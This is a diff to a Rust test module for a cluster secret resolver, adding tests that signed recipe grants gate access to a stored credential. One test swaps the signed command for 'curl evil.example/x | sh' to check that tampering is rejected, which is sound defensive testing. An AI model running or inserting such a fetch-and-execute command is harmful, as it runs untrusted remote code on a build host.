@@ -730,7 +730,12 @@ mod tests {
         // An empty local root — these tests only exercise the Cluster arm unless
         // they populate the store dir explicitly.
         let root = tempfile::TempDir::new().unwrap();
-        ClusterResolver::new(store, kek, LocalFileResolver::new(root.path()), test_consumer())
+        ClusterResolver::new(
+            store,
+            kek,
+            LocalFileResolver::new(root.path()),
+            test_consumer(),
+        )
     }
 
     #[test]
@@ -945,10 +950,7 @@ mod tests {
     // ── Access rules (R706 / W294) ──────────────────────────────────────────
 
     /// Build a resolver for a workload *other* than the one the fixtures admit.
-    fn resolver_for(
-        store: FakeClusterStore,
-        workload: &str,
-    ) -> ClusterResolver<FakeClusterStore> {
+    fn resolver_for(store: FakeClusterStore, workload: &str) -> ClusterResolver<FakeClusterStore> {
         let root = tempfile::TempDir::new().unwrap();
         ClusterResolver::new(
             store,
@@ -1001,6 +1003,172 @@ mod tests {
             denied, absent,
             "a denied read must be externally identical to a missing one"
         );
+    }
+
+    // ── Recipe rules end to end (R555-F5 / W235 §(c)) ───────────────────────
+
+    /// The whole two-sided chain in one test, with a real signature: a recipe
+    /// author signs a grant, the node verifies it against a pinned key, the
+    /// verified recipe identity rides onto the `SecretConsumer`, and the vault
+    /// record's own `Recipes` rule is what finally serves the bytes.
+    ///
+    /// Worth doing end to end rather than as four unit tests, because every
+    /// link is in a different crate and the property only exists if all four
+    /// hold at once — a run gets the R2 key because it *proved* it is the
+    /// recipe that was granted one, not because it named the secret.
+    fn signed_forge_spec(
+        recipe: &str,
+    ) -> (workload_spec::WorkloadSpec, String, ed25519_dalek::SigningKey) {
+        use ed25519_dalek::SigningKey;
+
+        let key = SigningKey::from_bytes(&[42u8; 32]);
+        // Hand-rolled hex rather than pulling the `hex` crate in as a
+        // dev-dependency for one line.
+        let public: String = key
+            .verifying_key()
+            .to_bytes()
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect();
+        let mut spec = workload_spec::WorkloadSpec::for_forge(
+            "0193a7c2-9f11-7e3a-9c1e-2b0f4d8e6a55",
+            workload_spec::ImageRef {
+                registry: "ghcr.io".into(),
+                repository: "yah-ai/builder".into(),
+                tag: "v1".into(),
+                digest: "sha256:".to_string() + &"a".repeat(64),
+            },
+            workload_spec::TierTag("infra".into()),
+            vec![],
+        );
+        spec.command = Some(vec!["build-v8.sh".into()]);
+        let grant = workload_spec::admission::AdmissionGrant::from_spec(recipe, &spec);
+        let signature = workload_spec::admission::sign_grant(&grant.encode(), &key);
+        workload_spec::admission::attach(&mut spec, &grant.encode(), &signature, &public);
+        (spec, public, key)
+    }
+
+    #[test]
+    fn a_signed_recipe_reads_the_credential_its_grant_names() {
+        let (spec, public, _) = signed_forge_spec("rusty-v8-musl");
+
+        // The node verifies against its pinned key set — this is the step that
+        // turns an assertion in an annotation into an identity.
+        let grant = workload_spec::admission::admit_grant(
+            &spec,
+            workload_spec::admission::Policy::Permissive,
+            std::slice::from_ref(&public),
+        )
+        .expect("a correctly signed spec is admitted")
+        .expect("and yields its grant");
+
+        let consumer = crate::deploy::secret_mount::consumer_for(&spec, Some(&grant));
+        let store = FakeClusterStore::new().with(
+            "r2/write",
+            seal_with(
+                &TEST_KEK,
+                &TEST_NONCE,
+                b"r2-secret-bytes",
+                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
+            ),
+        );
+        let root = tempfile::TempDir::new().unwrap();
+        let resolver = ClusterResolver::new(
+            store,
+            TEST_KEK,
+            LocalFileResolver::new(root.path()),
+            consumer,
+        );
+
+        let bytes = resolver
+            .resolve(&SecretRef::Cluster {
+                name: "r2/write".into(),
+            })
+            .expect("the recipe rule admits this run");
+        assert_eq!(bytes, b"r2-secret-bytes");
+    }
+
+    #[test]
+    fn a_tampered_dispatch_gets_no_identity_and_therefore_no_credential() {
+        let (mut spec, public, _) = signed_forge_spec("rusty-v8-musl");
+        // Swap the argv under the signature — the classic tampering shape.
+        spec.command = Some(vec!["curl evil.example/x | sh".into()]);
+
+        assert!(
+            workload_spec::admission::admit_grant(
+                &spec,
+                workload_spec::admission::Policy::Permissive,
+                std::slice::from_ref(&public),
+            )
+            .is_err(),
+            "coverage must catch the swapped argv"
+        );
+
+        // What the deploy handler then has is `None`, so no recipe identity.
+        let consumer = crate::deploy::secret_mount::consumer_for(&spec, None);
+        let store = FakeClusterStore::new().with(
+            "r2/write",
+            seal_with(
+                &TEST_KEK,
+                &TEST_NONCE,
+                b"r2-secret-bytes",
+                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
+            ),
+        );
+        let root = tempfile::TempDir::new().unwrap();
+        let resolver = ClusterResolver::new(
+            store,
+            TEST_KEK,
+            LocalFileResolver::new(root.path()),
+            consumer,
+        );
+
+        let err = resolver
+            .resolve(&SecretRef::Cluster {
+                name: "r2/write".into(),
+            })
+            .unwrap_err();
+        assert!(matches!(err, SecretError::Forbidden { .. }), "got {err}");
+    }
+
+    /// A run signed by a key the node pins, for a recipe the *secret* does not
+    /// name, still gets nothing. Admission and access are two gates, not one.
+    #[test]
+    fn a_validly_signed_but_unnamed_recipe_is_still_refused() {
+        let (spec, public, _) = signed_forge_spec("whisper-bundle-tar");
+        let grant = workload_spec::admission::admit_grant(
+            &spec,
+            workload_spec::admission::Policy::Permissive,
+            std::slice::from_ref(&public),
+        )
+        .unwrap()
+        .unwrap();
+
+        let consumer = crate::deploy::secret_mount::consumer_for(&spec, Some(&grant));
+        let store = FakeClusterStore::new().with(
+            "r2/write",
+            seal_with(
+                &TEST_KEK,
+                &TEST_NONCE,
+                b"r2-secret-bytes",
+                SecretAccess::recipes([("rusty-v8-musl", public.as_str())]),
+            ),
+        );
+        let root = tempfile::TempDir::new().unwrap();
+        let resolver = ClusterResolver::new(
+            store,
+            TEST_KEK,
+            LocalFileResolver::new(root.path()),
+            consumer,
+        );
+        assert!(matches!(
+            resolver
+                .resolve(&SecretRef::Cluster {
+                    name: "r2/write".into()
+                })
+                .unwrap_err(),
+            SecretError::Forbidden { .. }
+        ));
     }
 
     #[test]
@@ -1090,6 +1258,7 @@ mod tests {
                 workload: TEST_WORKLOAD.into(),
                 tenant: workload_spec::TenantId("acme".into()),
                 namespace: workload_spec::NamespaceId::singleton(),
+                recipe: None,
             },
         );
 
